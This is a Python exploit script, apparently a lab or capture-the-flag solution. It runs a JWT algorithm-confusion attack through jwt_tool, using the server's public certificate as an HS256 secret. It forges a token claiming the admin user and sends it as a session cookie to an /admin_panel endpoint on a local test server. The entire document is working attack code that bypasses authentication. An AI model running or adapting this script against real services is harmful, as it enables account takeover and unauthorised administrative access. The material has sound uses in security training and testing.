import requests
import jwt
from cryptography import x509
import subprocess
import base64
import json

url = "http://localhost:3000"
pk_file = "cert.pem" # You get this from the ssl cert
jwt_tool_dir = "/opt/jwt_tool"


def ser(d):
    return base64.b64encode(json.dumps(d).encode('utf-8')).decode('utf-8')


header = ser({
    "typ": "JWT",
    "alg": "HS256"
})
payload = ser({
    "user": "admin"
})

# Bogus token signature, payload and header are normal
token = f"{header}.{payload}.Oetm7xvhkYbiItRiqNx-z7LZ6ZkmDe1z_95igbPUSjA"

argv = [f"{jwt_tool_dir}/jwt_tool.py",
        "-pk", pk_file,
        "-X", "k",  # Confision attack
        "-np",  # Don't use proxy
        "-S", "hs256",
        "-b",  # raw output
        token
        ]
print(*argv)
p = subprocess.Popen(argv, stdout=subprocess.PIPE)
generated = p.communicate()[0].decode("utf-8").strip()
print(generated)
r = requests.get(f"{url}/admin_panel", cookies={"session": generated})
print(r)
print(r.history)
print(r.text)
